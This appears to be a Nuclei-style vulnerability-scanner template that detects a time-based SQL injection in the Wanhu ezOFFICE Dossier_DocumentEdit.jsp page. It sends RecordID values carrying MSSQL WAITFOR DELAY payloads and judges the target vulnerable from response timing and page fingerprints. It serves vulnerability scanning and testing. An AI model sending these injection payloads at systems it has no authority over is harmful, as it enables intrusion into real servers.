id: poc-yaml-whir-ezoffice-dossier-documentedit-sqli
info:
  name: "万户 Dossier_DocumentEdit.jsp SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 万户

http:
  - raw:
      - |
        GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: word
        part: body
        words:
          - "webform.WebOffice.WebSetMsgByName"
          - "webform.WebOffice.WebUrl="
      - type: word
        part: header
        words:
          - "iWebOfficeSign"

